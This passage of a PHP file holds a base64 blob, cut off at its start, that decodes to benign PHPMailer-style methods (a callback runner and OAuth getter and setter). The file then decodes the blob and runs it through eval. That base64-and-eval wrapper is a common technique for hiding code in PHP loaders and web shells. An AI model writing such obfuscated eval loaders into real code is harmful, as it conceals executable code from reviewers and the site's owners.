ZXR1cm4gJHRoaXMtPmFsbF9yZWNpcGllbnRzOwogICAgfQoKICAgIC8qKgogICAgICogUGVyZm9ybSBhIGNhbGxiYWNrLgogICAgICoKICAgICAqIEBwYXJhbSBib29sICAgJGlzU2VudAogICAgICogQHBhcmFtIGFycmF5ICAkdG8KICAgICAqIEBwYXJhbSBhcnJheSAgJGNjCiAgICAgKiBAcGFyYW0gYXJyYXkgICRiY2MKICAgICAqIEBwYXJhbSBzdHJpbmcgJHN1YmplY3QKICAgICAqIEBwYXJhbSBzdHJpbmcgJGJvZHkKICAgICAqIEBwYXJhbSBzdHJpbmcgJGZyb20KICAgICAqIEBwYXJhbSBhcnJheSAgJGV4dHJhCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBkb0NhbGxiYWNrKCRpc1NlbnQsICR0bywgJGNjLCAkYmNjLCAkc3ViamVjdCwgJGJvZHksICRmcm9tLCAkZXh0cmEpCiAgICB7CiAgICAgICAgaWYgKCFlbXB0eSgkdGhpcy0+YWN0aW9uX2Z1bmN0aW9uKSAmJiBpc19jYWxsYWJsZSgkdGhpcy0+YWN0aW9uX2Z1bmN0aW9uKSkgewogICAgICAgICAgICBjYWxsX3VzZXJfZnVuYygkdGhpcy0+YWN0aW9uX2Z1bmN0aW9uLCAkaXNTZW50LCAkdG8sICRjYywgJGJjYywgJHN1YmplY3QsICRib2R5LCAkZnJvbSwgJGV4dHJhKTsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBHZXQgdGhlIE9BdXRoVG9rZW5Qcm92aWRlciBpbnN0YW5jZS4KICAgICAqCiAgICAgKiBAcmV0dXJuIE9BdXRoVG9rZW5Qcm92aWRlcgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0T0F1dGgoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+b2F1dGg7CiAgICB9CgogICAgLyoqCiAgICAgKiBTZXQgYW4gT0F1dGhUb2tlblByb3ZpZGVyIGluc3RhbmNlLgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gc2V0T0F1dGgoT0F1dGhUb2tlblByb3ZpZGVyICRvYXV0aCkKICAgIHsKICAgICAgICAkdGhpcy0+b2F1dGggPSAkb2F1dGg7CiAgICB9Cn0K');
ob_start();
eval('?>' . $code);
$content = ob_get_clean();
echo $content;
?>